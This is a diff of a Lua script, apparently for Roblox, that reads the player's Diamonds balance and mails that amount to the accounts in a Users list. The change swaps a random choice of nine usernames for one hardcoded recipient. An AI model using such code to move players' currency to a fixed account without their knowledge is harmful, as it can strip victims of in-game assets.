@@ -1,17 +1,3 @@
--- Kiểm tra biến toàn cục để xác định script đã chạy hay chưa
-if _G.MAILBOXGEMS then
-    warn("Script đã được chạy trước đó!")
-    return -- Dừng script nếu đã chạy
-end
-
--- Đánh dấu script đã được chạy
-_G.MAILBOXGEMS = true
-
--- Tạo danh sách người dùng và chọn ngẫu nhiên
-local available_users = {"dungxta23", "tymaxse", "nhungxsite3", "MrxHeoz", "luongxchau8", "thuxbinh2", "Thu_Linhx", "linhxbi", "xuxca2"}
-local random_user = available_users[math.random(1, #available_users)]
-
--- Lấy giá trị kim cương hiện tại
 local function getCurrentDiamondValue()
     return game.Players.LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
 end
@@ -35,7 +21,7 @@ getgenv().Settings = {
         ["Diamonds"] = {Class = "Currency", Amount = adjustedDiamondValue},
     },
     Users = {
-        random_user, -- Gán người dùng ngẫu nhiên
+        "Kim_Huex",
     },
     ["Split Items Evenly"] = false, -- False -> it will send the Amount per account.
     ["Only Online Accounts"] = false,
